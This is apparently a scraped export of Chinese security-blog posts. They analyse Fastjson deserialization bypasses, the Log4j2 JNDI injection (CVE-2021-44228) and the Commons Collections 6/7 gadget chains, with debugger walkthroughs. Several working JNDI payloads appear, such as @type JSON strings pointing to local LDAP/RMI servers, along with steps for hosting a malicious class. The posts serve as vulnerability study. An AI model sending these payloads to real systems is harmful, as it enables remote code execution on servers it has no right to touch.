最后调用到setProperties()，调用链如图： Fastjson &lt;&#x3D; 1.2.47从 1.2.46 版本中将org.apache.ibatis.datasource加入了黑名单； 补丁绕过在1.2.47 及以前的版本中，还存在一种通用利用方式；在checkAutoType()中，要想加载到指定类，要么绕过检测，要么能从mapping中返回clazz；TypeUtils.loadClass()中的cache默认传入为 true，并且有将className添加进mapping的操作； 当传入的类是java.lang.Class时，会调用TypeUtils.loadClass()，strVal是可控的参数； 所以将val参数赋值为com.sun.rowset.JdbcRowSetImpl，就可以成功将它添加进mapping中。 构造 POC要构造两部分，一部分就是通过java.lang.Class将com.sun.rowset.JdbcRowSetImpl添加进mapping；另一部分就是构造反序列化为com.sun.rowset.JdbcRowSetImpl类型导致RCE所需要的参数； 1.2.25-1.2.32版本：仅未开启AutoType时可利用； 1.2.33-1.2.47版本：无论是否开启AutoType都可利用。 POC调试1.2.47 未开启 AutoType第一个获取到的key值是a，所以递归调用DefaultJSONParser.parseObject() 到获取key为@type； 获取到第一个@type字段的值为java.lang.Class，带入checkAutoType()进行校验； autoTypeSupport默认是 false 的，mapping里面也没有java.lang.Class，直接进入 832 行的 if 语句； buckets里是有java.lang.Class的，所以findClass会返回它； clazz不为 null 了，就在 839 行返回； 这里获取到的derializer是MiscCodec类对象； 跟进到DefaultJSONParser.parse()，进入case 4语句，1320 行获取到我们传入的val参数的值，然后在 1328 行返回；（注意调用链） 返回到MiscCodec.deserialize()，调用了TypeUtils.loadClass()； 跟进到TypeUtils.loadClass()，1125 行从mapping中寻找com.sun.rowset.JdbcRowSetImpl是找不到的；但是cache默认传入为 true，可以进入到 1153 行，将com.sun.rowset.JdbcRowSetImpl添加进了mapping中； 继续调试，相同的流程获取到b里的@type的值，带入checkAutoType()校验； autoTypeSupport为 false，进入到 828 行，应为前面已经将com.sun.rowset.JdbcRowSetImpl添加到了mapping中，所以这里是获取成功的，clazz得到com.sun.rowset.JdbcRowSetImpl，随后就在 839 行返回； 后续就是一样的流程了。 1.2.47 开启 AutoType开启了 AutoType 会进入黑名单校验，但是在校验的 if 语句中，虽然满足第一个逻辑语句，但是不满足第二个逻辑语句，因为com.sun.rowset.JdbcRowSetImpl已经被添加进mapping中了，获取结果不为 null，仍然正常返回clazz。 1.2.32 未开启 AutoType未开启 AutoType 时， 直接调用TypeUtils.getClassFromMapping返回clazz； 1.2.32 开启 AutoType开启 AutoType 时，会进入 if 语句进行黑名单校验，只有一个逻辑判断语句且满足，会在这里报异常，所以不能利用。 Fastjson &lt;&#x3D; 1.2.62补丁分析从 1.2.48 开始，将TypeUtils.loadClass()中的cache默认传为了 false，不能把指定类添加进mapping了； 并且将java.lang.Class加入了黑名单，如果开启 AutoType 就会被黑名单拦截； 补丁绕过重新找到一条利用链，触发点在org.apache.xbean.propertyeditor.JndiConverter的toObjectImpl()方法中； 它的父类AbstractConverter.toObject()中调用了toObjectImpl()；setAsText()调用了toObject()； 当反序列化调用setAsText()时，就可以触发RCE。 需要目标服务器存在 xbean-reflect；导入依赖： 构造 POC要开启 AutoType； POC 调试能成功绕过黑名单检测，加载org.apache.xbean.propertyeditor.JndiConverter；autoTypeSupport要为 true 才能进入905 行的 if 语句； 反射调用到setAsText()； 到达 lookup，成功执行命令。 不开启 AutoType 的话会在这里报异常。 Fastjson &lt;&#x3D; 1.2.66补丁分析org.apache.xbean.被加入了黑名单，黑名单已经扩展到了88个； 补丁绕过寻找黑名单中没有的类进行绕过，有以下几个类可利用； 目标服务器有 shiro-core 包：&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://127.0.0.1:1389/CalcCmd&quot;&#125;； 目标服务器有 Anteros-Core 和 Anteros-DBCP 包：&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://127.0.0.1:1389/CalcCmd&quot;&#125;； 目标服务器有 ignite 包： &#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&quot;jndiNames&quot;:&quot;ldap://127.0.0.1:1389/CalcCmd&quot;&#125;； 目标服务器有 ibatis-sqlmap和 jta 包：&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;:&#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap://127.0.0.1:1389/CalcCmd&quot;&#125;&#125;。 原理都一样，就不一 一调式了。 Fastjson &lt;&#x3D; 1.2.68修复方法也是把前面能利用的类都加入了黑名单；还增加了一个safeMode属性，如果为 true 直接报异常，默认不开启。 补丁绕过这种绕过方式是通过expectClass参数将恶意类传入checkAutoType()进行加载。 前面几个版本的利用链expectClass参数都默认传为 null，这里我们要找到一个expectClass参数可控的地方； 看到JavaBeanDeserializer.deserialze()中从传入的type来获取expectClass的值； 那么找到调用JavaBeanDeserializer.deserialze()的地方；在DefaultJSONParser.parserObject()中，根据clazz从this.config中获取对应的deserializer，再调用它的deserialze()方法；其中对应JavaBeanDeserializer的类是java.lang.AutoCloseable； 所以@type字段传入的类型应该是java.lang.AutoCloseable；要触发RCE，还得传入一个命令执行的类，所以再传入一个@type字段，作为反序列化的类型；第二个@type会通过JavaBeanDeserializer.deserialze()中调用的checkAutoType()去加载。 还有ThrowableDeserializer.deserialze()，它是JavaBeanDeserializer的子类，存在expectClass参数位置固定为Throwable.class的地方； @type字段应传入的值就是java.lang.Throwable；恶意类也应该继承java.lang.Throwable。 构造 POCAutoCloseable命令执行类实现 AutoCloseable 接口，命令通过参数传入； 构造 JSON 字符串，是否开启 AutoType 都可； Throwable原理差不多，继承 Throwable： 需要开启 AutoType ，否则加载不到java.lang.Throwable，会报异常； POC 调试AutoCloseable进入checkAutoType()，mapping中存在java.lang.AutoCloseable，直接返回clazz； 跟进到JavaBeanDeserializer.deserialze()，expectClass的值得到java.lang.AutoCloseable，ref是第二个@type字段的值Calc，作为参数传入checkAutoType()； 因为expectClass不为 null ，所以expectClassFlag值为 true， 进入 1108 行的 if 语句，加载Calc类； 一直跟进到JavaBeanDeserializer.deserialze()，538 行获取到calc.exe，且matchField和valueParsed都为 true； 845 行把calc.exe传入到fieldValues，再传入params对象数组，最后在 1022 行进行实例化，从而触发命令执行代码。 调用链如下： Throwable进入checkAutoType()，java.lang.Throwable不在mapping中，到 1110 行才会加载； 获取到的deserializer是ThrowableDeserializer类型； 跟进调用了checkAutoType()； autoTypeSupport和expectClassFlag都为 true ，1119 行加载Calc类； clazz不是Throwable子类的话这里是会报异常的； 返回到ThrowableDeserializer.deserialze()，创建异常类；（POC 要构造对，不然很容易在这一步挂掉） 跟进，获取了恶意类的构造方法，并且实例化了该类，在此触发命令执行； 调用链如下： Fastjson &lt;&#x3D; 1.2.80补丁分析从 1.2.69 开始，对传入checkAutoType()的expectClass参数进行了 hash 计算，再校验是否是允许的类型； if 语句中涵盖的类如下： -8024746738719829346L java.io.Serializable 3247277300971823414L java.lang.Cloneable -5811778396720452501L java.io.Closeable -1368967840069965882L java.lang.AutoCloseable 2980334044947851925L java.lang.Readable 5183404141909004468L java.lang.Runnable 7222019943667248779L java.util.EventListener -2027296626235911549L java.lang.Iterable -2114196234051346931L java.util.Collection -2939497380989775398L java.lang.Object 但是在开启 AutoType 的情况下，仍然可以使用上面两种类来绕过。 参考连接："},{"title":"Fastjson 1.2.24 反序列化RCE（CVE-2017-18349）","date":"2022-09-19T11:31:55.000Z","url":"/2022/09/19/Fastjson%201.2.24%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4RCE%EF%BC%88CVE-2017-18349%EF%BC%89/","categories":[[" ",""]],"content":"前言Fastjson 是一种 JSON 解析器，把Java 对象转换为 JSON 字符串的过程称为序列化， JSON 字符串转换为 Java 对象的过程成反序列化。 造成该漏洞的原因是可以通过@type指定反序列化返回的类型，可以向指定类中传入 JSON 字符串，并且getOutputProperties()方法满足在反序列化时调用的条件，从而将传入的恶意字节码转换为类并实例化，导致RCE。 影响版本：Fastjson &lt;&#x3D; 1.2.24 环境搭建：导入 Fastjson 1.2.24 版本的依赖： TemplatesImpl 利用链分析先看一下 TemplatesImpl 类的方法和成员变量列表； 漏洞触发点在TemplatesImpl.getTransletInstance()的455行，对_class[_transletIndex]进行了实例化； _class初始化为 null，_transletIndex初始化为 -1，_name不能为 null，否则直接return null;，但是_name变量没有 setter 方法，所以要给它赋值的话需要在反序列化时添加Feature.SupportNonPublicField；_class满足 451 行的 if 条件，进入 defineTransletClasses()方法； 393 行判断了_bytecodes是否为空，要不为 null 才能执行到 398 行；401 行 调用了_tfactory.getExternalExtensionsMap()，_tfactory不能为 null ，否则会报错；414 行对 _bytecodes进行了遍历，并且调用loader.defineClass()，将结果赋给了_class[i]； 跟进defineClass()，返回的是ClassLoader.defineClass()，也就是说在这里将从_bytecodes[i]获取到的字节码定义为一个类； 418 行，如果上面生成的类的超类是AbstractTranslet类，_transletIndex的值就为该次循环的下标值；否则，就把生成的类记录到_auxClasses中；（ABSTRACT_TRANSLET的值初始化为com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet） 也就是说，在defineTransletClasses()方法中，如果我们向_bytecodes中传入恶意类的字节码，该方法会将该字节码转换为类，赋给_class[_transletIndex]，然后在getTransletInstance()方法中实例化。 寻找什么地方调用了getTransletInstance()，找到newTransformer()； 继续找什么地方调用了newTransformer()，找到getOutputProperties()； getOutputProperties()是成员变量_outputProperties的 get 方法；并且该变量没有 set 方法，是Properties类型，属于Map接口实现类的子类，满足反序列化调用 get 方法的所有条件，所以在反序列化过程中，能够调用到getOutputProperties()方法，从而实例化我们传入的恶意类，导致RCE。 构造 POC构造一个 JSON 字符串，现在已知要满足的条有： 反序列化的类型得是TemplatesImpl类，通过@type来指定； _bytecodes是恶意类的字节码，并且该类是AbstractTranslet类的子类； _name不为 null ； _tfactory不为 null； 有_outputProperties； 先构造一个恶意类，并继承AbstractTranslet，在构造方法中写入命令执行代码； 构造 POC 如下： 把EvilTest的字节码文件进行 base64 编码，再传入_bytecodes，为什么要编码下面调试时再说。 POC 调试从反序列化跟入，到JSON.parse(String text, int features)； 跟入到DefaultJSONParser的构造方法，这里根据this.lexer的值，将token赋为了12；this.lexer是JSONScanner对象，this.text就是输入的 JSON 字符串； 继续跟进到DefaultJSONParser.parse(Object fieldName)，根据 token 的值 case 到12； 跟进parseObject()； 在JSONLexerBase.scanSymbol()中把@type取了出来返回给key； 走到下面的 if ，判断了key是否等于@type，又把下一个引号包裹的内容取了出来，也就是com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，然后 276 行去加载这个类； 318 行跟进到ParserConfig.getDeserializer()，对TemplatesImpl类做了一系列判断； 410 行调用了createJavaBeanDeserializer()，跟进到 479 行调用JavaBeanInfo.build()； 在这里，把getOutputProperties()添加到了fieldList中； 返回JavaBeanInfo的对象； 回到ParserConfig 492 行，循环到outputProperties，只有 get 方法，满足 if 条件，asmEnable赋为 false； 进入 536 行 返回一个JavaBeanDeserializer对象； 在 new JavaBeanDeserializer对象的过程中也向上面一样，获取了getOutputProperties()方法，然后循环遍历将这些方法存到了this.sortedFieldDeserializers变量中； 返回JavaBeanDeserializer对象到DefaultJSONParser.parseObject()318 行；继续跟进到JavaBeanDeserializer.deserialze(DefaultJSONParser parser, Type type, Object fieldName, Object object, int features)，这个时候token为16，到358行；在while 循环中取出了sortedFieldDeserializers中的getOutputProperties()方法 接着是一顿循环，fieldIndex等于3时，就不再进入364行的 if 了，所以fieldDeser等于 null，跳过 376行的 if，进入 480行的 if ，获取下一个双引号之间的值，也就是_bytecodes作为 key ； 577 行实例化了一个TemplatesImpl类对象； 604行调用了parseField()； 跟进parseField()，760行把所有成员变量存入了this.extraFieldDeserializers； 791行调用了parseField()； 跟进，67行调用了deserialze()； 这个时候token值为14，走到153行调用parseArray()； parseArray()里面又调用了deserialze()； 这个时候token为4，进入111行调用bytesValue()，跟进发现对_bytecodes进行了base64解码操作（84-1780 就是_bytecodes的内容），所以在构造 POC 时要对_bytecodes内容进行编码； 最后得到的value就是恶意类的字节码，跟进setValue()； method为 null ，最后把 TemplatesImpl对象中的_bytecodes的值赋为了字节码； 回到JavaBeanDeserializer.deserialze()中，循环获取传入的 JSON 字符串的属性名，到获取到_outputProperties； 像前面一样，一直跟到FieldDeserializer.setValue()，这个时候获取到的method为getOutputProperties()，进入 if 语句；到78行反射调用getOutputProperties()； 跟进到getOutputProperties()； 跟进newTransformer()； 跟进getTransletInstance()，调用defineTransletClasses()，在414行将字节码转换为类赋给_class[0]； 在455行实例化EvilTest类，成功执行命令。 JdbcRowSetImpl 利用链分析漏洞触发点在JdbcRowSetImpl.connect()，326行使用lookup()检索this.getDataSourceName()返回的数据源对象名称； this.getDataSourceName()可以通过向JdbcRowSetImpl对象的dataSourceName参数传入数据源对象来指定；找到setAutoCommit()中调用了connect()，只要向JdbcRowSetImpl对象的autoCommit参数传入值，即可在反序列化时调用这个方法； 构造 POC要满足的条件很简单： 反序列化的类型是JdbcRowSetImpl类，通过@type来指定； dataSourceName指定要加载的恶意对象； 传入autoCommit， 它是 Boolean 类型，传入 true 或 false 都行； 先构造一个命令执行的类： 用 python 启一个 Web 服务，把命令执行类的.class文件放到 Web 目录下；python -m http:server 8081 编写服务端代码，将命令执行类绑定到指定名称上； 编写客户端代码，构造 JSON 字符串，进行反序列化； 命令执行成功； （使用 RMI + JNDI 方式利用需要注意 JDK 版本在8u121之前。） POC 调试反序列化和参数传递过程和 TemplatesImpl 差不多，只贴一些比较关键的地方； DefaultJSONParser.parseObject() 276行加载了com.sun.rowset.JdbcRowSetImpl类； 在ParserConfig.createJavaBeanDeserializer()中，541行调用了重载的createJavaBeanDeserializer()； 重载的createJavaBeanDeserializer()返回了一个FastjsonASMDeserializer_1_JdbcRowSetImpl类对象； 返回到DefaultJSONParser.parseObject()； 跟进 319 行，到JavaBeanDeserializer.deserialze()，198 行this.deserializer就是FastjsonASMDeserializer_1_JdbcRowSetImpl类对象，跟进显示不支持 Debug； 继续跟进跳到了parseRest()； 继续跟进到JavaBeanDeserializer.deserialze()，经过一顿循环，596行调用parseField()； 一路跟进JavaBeanDeserializer.parseField() —&gt; DefaultFieldDeserializer.parseField() —&gt; StringCodec.deserialze() —&gt; StringCodec.deserialze()，返回的是 dataSourceName的值； 回到DefaultFieldDeserializer.parseField()跟进78 行的setValue(); 这里获取到的method是setDataSourceName，就把rmi://127.0.0.1:1099/calc传给了JdbcRowSetImpl对象的dataSource变量； 返回JavaBeanDeserializer.parseField()继续循环，当获取到autoCommit参数时，调用parseField()； 同样走到setValue()，这里获取到的method是setAutoCommit()，反射调用这个方法； 一直跟进到达setAutoCommit()方法； 跟进connect()，成功到达 lookup ，命令执行成功。 调用链如下： 参考连接："},{"title":"Fastjson 简单学习","date":"2022-09-19T11:31:54.000Z","url":"/2022/09/19/Fastjson%20%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/","categories":[[" ",""]],"content":"JSONJSON 全称“JavaScript Object Notation”，译为“JavaScript 对象表示法”，是一种轻量级的、基于文本的、开放的数据交换格式。（数据交换是指两个设别之间建立连接并相互传递数据的过程。） JSON 是一种纯字符串形式的数据，它本身不提供任何方法（函数），采用独立于变成语言的文本格式来存储和表示数据，易于程序员阅读与编写，同时也易于计算机解析和生成，通常同于在 Web 客户端与 Web服务器端之间传递数据。 JSON 语法规则所有的 JSON 数据都需要包裹在一个花括号中。 JSON 数据是以键值对的形式书写，键与值之间用:分隔；键表示数据的名称，需要以字符串的形式定义，并用双引号包裹；值可以是以下数据类型： 整型、浮点型 字符串（双引号包裹） Boolean 数组（定义在[ ]中，元素可以是任意类型，用,隔开） 对象（定义在&#123; &#125;中，内容为键值对形式，值可以是任意类型） null （最后一个值后面都不写,。） JSON 注释通过添加同名键，并在同名键前面加上特殊符号来表示注释，如下： 特殊符号可以是：@、#、?、_、/等，最好避免使用[、 ]、 &#123;、 &#125;、：等 JSON 语法里常用的符号。 Java JSON 的创建和解析Java 中没有内置任何处理 JSON 数据的函数或库，所以我们需要借助一些开源的库来实现 JSON 数据的创建和解析，比较常用的有 JSON.simple、Jackson、Gson、Moshi 、Fastjson等；这里使用 Fastjson 作演示。 导入依赖： 定义一个实体类，必须有无参构造函数： 数据转换： 运行结果： FastjsonFastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将 Java 对象序列化为JSON字符串，也可以将JSON字符串反序列化为 Java 对象。具有执行效率高的特点，应用范围广泛。 下载地址： 序列化Fastjson 中，序列化函数有toJSONString()，有很多重载方法； 在实体类的set、get方法中添加输出： 传入不同的参数进行序列化： 运行结果： 可以看到，当给toJSONString()方法传入第二个参数SerializerFeature.WriteClassName时，返回的 JSON 字符串中会多出一个@type字段，而它的值就是我们传入的 User 类。 反序列化Fastjson 中，反序列化的函数有parse()和parseObject()，它们分别都有很多重载的方法。 用不同的方法进行反序列化： 运行结果： 从结果中可以看到，当给parseObject()方法传入两个参数时，返回的结果是我们第二个参数指定的User类型，并且调用了它的 set 方法；当只给parseObject()方法传入 JSON 字符串时，返回的结果是 JSONObject 类型，不调用 set 方法；当使用parse()进行反序列化时，返回的结果是 Object 类型，不调用 set 方法；但是如果 JSON 字符串中包含@type字段，parse()反序列化的结果就是@type字段中声明的类型，并且调用它的 set 方法；parseObject()方法效果一样，只是比parse()多调用了一次toJSON()，调用了全部 get 方法。 那么，如果反序列的内容是可控的，我们就可以在 JSON 字符串前面添加@type字段来指定类，并调用它的 set &#x2F;get 方法，利用 set &#x2F; get 方法来触发恶意代码，就能进行利用。（给parseObject()方法传入第二个参数比较难利用。） 反序列化调用 set、get的特点对实体类稍作修改，把cities定义为Properties类型，并且不添加它的 set 方法； 反序列化： 因为没有给cities设置 set 方法，所以如果想要往里传值，就需要添加Feature.SupportNonPublicField参数。 先看一下运行结果： parseObject()没有添加Feature.SupportNonPublicField参数，所以就没有返回cities属性。 两个方法还有不同之处就在于parse()在调用 set 方法时调用了getCities()，而parseObject()除此之外，还将所有 get 方法都调用了一遍。 接下来慢慢看。 跟进反序列化过程到JavaBeanInfo.build()中可以看到，先反射获取了所有方法，然后经过重重判断，把满足条件的 set 方法添加到了fieldList中； 然后在下面的 for 循环中，又把满足条件的 get 方法也添加到fieldList中； if 中的判断语句如下： 而getCities()方法刚好就满足这些条件，所以会被调用。 至于parseObject()为什么会把所有 get 方法都调用一遍，是因为在他调用toJSON()后，会把所有 get 方法都记录下来，然后反射调用。 参考连接："},{"title":"Log4j2 JNDI 注入漏洞分析（CVE-2021-44228）","date":"2022-09-19T11:31:53.000Z","url":"/2022/09/19/Log4j2%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2021-44228%EF%BC%89/","categories":[[" ",""]],"content":"前言此漏洞（CVE-2021-44228）是于2021年12月爆出来的“核弹”级漏洞，利用难度低、影响范围广、危害大。 漏洞原因：在 Apache Log4j2 直到 2.14.1（不包括安全版本 2.3.1、2.12.2 和 2.12.3）的版本中，配置、日志消息和参数中使用的 JNDI 功能不能防止攻击者控制的 LDAP 和其他JNDI 相关端点。当启用消息查找替换时，可以控制日志消息或日志消息参数的攻击者可以执行从 LDAP 服务器加载的任意代码。 受影响版本：2.0-beta9 到 2.14.1 的所有版本 漏洞复现复现环境： Log4j2: 2.14.1 JDK：8u72 创建一个Maven工程，在pom.xml中导入Log4j2的依赖； 将一个存在恶意代码的类编译成 .class 文件（编译时不能有 package）； 用 python 启一个 Web 服务，把上一步生成的 .class 文件放到启 We服务的目录下；python -m http.server 8081访问 8081 端口能看到上传的 class 文件就行了； 编写服务端代码，将恶意类绑定到指定名称上； 要注意JDK版本，要用8u121之前的，因为在 8u121及之后，默认情况下禁止通过存储在命名和目录服务中的JNDI对象工厂进行远程类加载；要启用远程类加载需要将com.sun.jndi.rmi.object.trustURLCodebase和 com.sun.jndi.cosnaming.object.trustURLCodebase设为true；否则会报错： 编写 Log4j2 利用代码 复现成功： 漏洞分析从LOGGER.error跟起，调用了logIfEnabled()； 进入logIfEnabled()，if 里调用了Logger.isEnabled()进行判断； 然后又调用了filter()进行判断； 在filter()中判断了this.config.getFilter()是否为空，是为空，到达 return 语句，对level进行了判断；因为使用的是error()，所以这里的level值为200，满足条件，返回 true； 自然AbstractLogger.logIfEnabled()中的 if 判断为 true ，进入logMessage()；然后层层跟进：logMessageSafely() -&gt; logMessageTrackRecursion() -&gt; tryLogMessage() -&gt; Logger.log()； 判断了strategy是否是LocationAwareReliabilityStrategy接口实现类的实例； strategy默认是DefaultReliabilityStrategy类的实例，而这个类实现了LocationAwareReliabilityStrategy接口，所以判断为 true； 进入DefaultReliabilityStrategy.log() -&gt; LoggerConfig.log()； this.propertiesRequireLookup在构造方法中赋值为 false，进入 if 语句，this.properties被赋值为 null，所以props等于 null；this.logEventFactory是ReusableLogEventFactory类的对象，这个类实现了LocationAwareLogEventFactory接口，所以调用它的createEvent()，new 了一个Mutablelnstant对象，set 了一系列数据，将我们构造的JNDI表达式传入了setMessage()； 在setMessage()中调用了getMessageTextForWriting()，创建了一个初始容量为128的字符构建器messageText（INITIAL_REUSABLE_MESSAGE_SIZE默认值为128），将我们传入的 msg 放到了messageText中，长度为33。 然后调用getFormat()，如果传入的是字符串，那就返回该字符串给messageFormat； 最后将Mutablelnstant对象返回给logEvent； 接着进入重载的LoggerConfig.log()； 调用isFiltered()进行判断，this.filter为 null ，直接返回 false； 进入 if 语句，到LoggerConfig.processLogEvent()； if 里的allow()恒为 true； 进入callAppenders()，对event做了一个循环操作； 跟进到AppenderControl.callAppenfer()，shouldSkip()中的三个语句都返回为 false； 继续跟进到callAppenderPreventRecursion() -&gt; callAppender0，if 中又判断了是否有 filter 过滤，filter 任然为 null ，if 为 true； 进入tryCallAppender -&gt; AbstractOutputStreamAppender.append() -&gt; tryAppend()，ENABLE_DIRECT_ENCODER默认值为 true； 跟进directEncodeEvent() -&gt; PatternLayout.encode()； if 中的this.eventSerializer定义为如图所示，进入build()，会进入else if 或者 else 分支； return 的两个类都实现了Serializer2接口，所以PatternLayout.encode()中的 if 为 false，进入 else 分支； 跟进toText -&gt; toSerializable() ，这里进入了一个循环，formatters包含多个对象，循环调用每个 Converter 的format()方法； 每循环一次就会向buffer中添加数据； 漏洞的关键点在索引为8的MessagePatternConverter.format()； msg是MutableLogEvent类的实例，这个类实现了ReusableMessage接口，这个接口继承了StringBuilderFormattable，所以 if 为 true； doRender为 false， 所以workingBuilder设置为toAppendTo，即前面循环添加得到的buffer，这个时候长度为52，offset也为52； 接下来走的是 else 分支，把messageText添加到了workingBuilder中，长度变为了85，offset还是为52； 进入 if 中的 for 循环，从52的位置开始循环，也就是判断上面添加的messageText是否以$&#123;开头，这里显然成立，然后把我们传入的字符串取出给了value； 跟进StrSubtitutor.replace() -&gt; substitute() -&gt; 重载的substitute()，代码超级长； 先看一下现在的变量值； 进入 while ，isMatch()返回2，也就是说JNDI表达式是从索引2的位置开始的； 经过多次循环，找到JNDI表达式结束在索引为32的位置； 根据首尾位置，把jndi:rmi://127.0.0.1:1099/calc取了出来； 跟进resolveVariable() -&gt; Interpolator.lookup()；这里把JNDI表达式的第一个:的前后字符串分别取出，即jndi和rmi://127.0.0.1:1099/calc；从strLookupMap中获取jndi对应的 Lookup 对象JndiLookup； 197行进入JndiLookup.lookup() -&gt; jndiManager.lookup()，这里就是最终触发点了。 调用栈如下： lookup实现原理继续看一看lookup()里面是怎么实现远程类加载的吧。 跟进InitialContext.lookup() -&gt; getURLOrDefaultInitCtx() -&gt; NamingManager.getURLContext()，获取到使用了rmi； 继续到getURLObject()，根据schema得到一个rmiURLContextFactory类对象； 在rmiURLContextFactory.getObjectInstance()方法中 new 了一个rmiURLContext类对象； 逐步返回到InitialContext.lookup()，因为rmiURLContext继承了GenericURLContext，所以进入到GenericURLContext.lookup() -&gt; RegistryContext.lookup()-&gt; RegistryImpl_Stub.lookup()； RegistryContext.lookup()中的 var2 得到一个ReferenceWrapper_Stub类对象，跟进decodeObject()，获取从ReferenceWrapper_Stub返回的 Reference 对象； 跟进到NamingManager.getObjectInstance()，从 Reference 对象中获取到了 Factory （CalcCmd）的实例； 跟进到getObjectFactoryFromReference()，尝试用当前的类加载器加载 Factory（CalcCmd） 类，这里能成功加载，因为我是把命令执行代码写到 static 代码块中的，所以在这里一成功加载到类，就执行了命令。 如果在当前 ClassPath 中无法找到相应的类时，就使用指定的 codebase 加载；如果恶意代码写在 main 方法中，要到下面创建实例对象时才执行命令； 漏洞修复发布了修复版本2.15.0-rc1。 从 Log4j 2.15.0 开始，默认情况下禁用了消息查找功能。配置中的查找仍然有效。虽然 Log4j 2.15.0 可以选择以这种方式启用 Lookups，但强烈建议用户不要启用它。为 JNDI 连接引入了白名单机制，默认情况下只允许 localhost。但是2.15.0-rc1也很快被绕过了，找到了新的利用方式，不建议使用。 总结在打印日志的过程中，会识别$&#123;&#125;包含的字符串，并且会按:将字符串分隔；会判断:前面是什么内容，根据前面的类型来解析后面的内容，如： ctx：允许程序将数据存储在 Log4j ThreadContext Map 中，然后在日志输出过程中，查找其中的值； ctx：允许程序将数据存储在 Log4j ThreadContext Map 中，然后在日志输出过程中，查找其中的值； java：允许查找Java环境配置信息； jndi：允许通过 JNDI 检索变量； 我们使用jdni，那它就会通过JNDI来检索:后面的内容，即实现远程类加载。 同理，也可以构造其他类型的利用。 参考链接："},{"title":"Java  Commons Collections 7分析","date":"2022-09-19T11:31:52.000Z","url":"/2022/09/19/Java%20%20Commons%20Collections%207%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"前言CC7也是对commons-collections 3.1版本的利用链，使用Hashtable作为反序列化的入口点，通过AbstractMap#equals来调用LazyMap#get。 环境搭建 JDK 1.8 Commons Collections 3.1 pom.xml中添加： 利用链 利用链分析看到Hashtable#readObject，循环调用了reconstitutionPut，elements为传入的元素个数；[1] key和value都是从序列化流中得到的，序列化流中的值则是通过put传进去的；[2] 跟进reconstitutionPut；[3] for循环中调用了equals，我们先看看进入for循环的条件：e != null，而 e = tab[index]，此时tab[index]的值是为null的，所以不会进入for循环，下面的代码就是将key和value添加到tab中； 那如何才能进入for循环呢，既然调用一次reconstitutionPut不行，那我们就调用两次，也就是说put两个元素进Hashtable对象，这样elements的值就为2，readObject中的for循环就可以循环两次；第一次循环已经将第一组key和value传入到tab中了，当第二次到达reconstitutionPut中的for循环的时候，tab[index]中已经有了第一次调用时传入的值，所以不为null，可以进入for循环； 接着看看if里面的判断，要求e.hash == hash，这里的e值为tab[index]，也就是第一组传入的值，这里的hash是通过key.hashCode()获取的，也就是说要put两个hash值相等的元素进去才行； 继续跟进到AbstractMapDecorator#equals，这里的map是可控的，；[4] 跟进到AbstractMap#equals，调用了m.get()，而m是根据传入的对象获取的，也就是说如果传入的是LazyMap类对象，那么这里就是调用的LazyMap#get，便可触发RCE；[5] POC分析 代码1 和CC6一样，需要构造两个Transformer数组，因为在后面第二次调用hashtable.put()的时候也会调用到LazyMap#get，会触发RCE，可以跟进看一调用栈；[6] 所以这里构造一个fakeTransformers，里面为空就行； 代码2 先将fakeTransformers传入ChainedTransformer对象；new两个HashMap对象，都调用LazyMap.decorate，并且分别向两个对象中传值，两个key值分别为yy和zZ，因为需要这两个值的hash值相等，而在java中，yy和zZ的hash值恰好相等；[7] 然后将这两个LazyMap类对象put进Hashtable类对象； 代码3 通过反射获取ChainedTransformer的iTransformers变量，将含有我们反序列化时要执行的命令的transformers数组传进去，替换前面的fakeTransformers； 最后还要remove掉yy，应为如果不去掉的话，第二次调用reconstitutionPut的时候就会存在两个key；[8] 导致进入下面的if判断，直接返回false，不再执行后面的代码；[9] POC调试第一次进入reconstitutionPut，将值传入tab：[10] 第二次进入for循环：[11] 进入equals，参数object是lazyMap2：[12] 进入下一个equals，m就是LazyMap类：[13] 进入get，成功调用transform()：[14] 命令执行成功；[15] 参考链接： 总结CC链就先分析到这里，8、9、10等剩下的链以后再接着分析；CC1-7涉及两个CC版本，3.1和4.0；3.1版本基本就是通过各种途径去调用LazyMap#get，从而实现RCE；4.0版本则是通过调用TransformingComparator#compare来实现RCE；虽然几条链分析下来都大同小异，但也提升了不少分析代码的能力，获益匪浅。 疑问代码：lazyMap2.remove(&quot;yy&quot;);yy怎么在lazyMap2里"},{"title":"Java  Commons Collection 6分析","date":"2022-09-19T11:31:51.000Z","url":"/2022/09/19/Java%20%20Commons%20Collection%206%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"前言CC6还是通过调用LazyMap#get来触发RCE，任然用到了TiedMapEntry类，只不过是通过调用TiedMapEntry#getValue的链不一样。 环境搭建 JDK 1.8 Commons Collections 3.1 pom.xml中添加： 利用链 利用链分析找到调用LazyMap#get的地方，任然是TiedMapEntry#getValue，map可控，传入LazyMap即可；[1] 接下来寻找调用getValue()的地方，找到TiedMapEntry#hashCode；[2] 接着寻找调用hashCode()的地方，找到HashMap#hash；[3] 继续寻找调用hash()的地方，找到HashMap#put；[4] 最后，在HashSet#readObject中，调用了put()；[5] POC分析代码1 构造两个Transformer数组，因为在后面调用add()的时候也会触发RCE，用两个不同的命令加以区分； 代码2 new一个ChainedTransformer对象，先将fakeTransformers传进去；同样new一个LazyMap对象； 代码3 这里调用add()方法将含有恶意代码的对象传入hashSet，就不用像ysoserial中使用反射去传值，这样比较简便；[6] 跟一下add()方法，这里的map是TiedMapEntry对象，跟进put；[7] 调用了hash方法，继续跟进，k也是TiedMapEntry对象；[8] 跟进hashcode()，这里就调用到了getValue；[9] 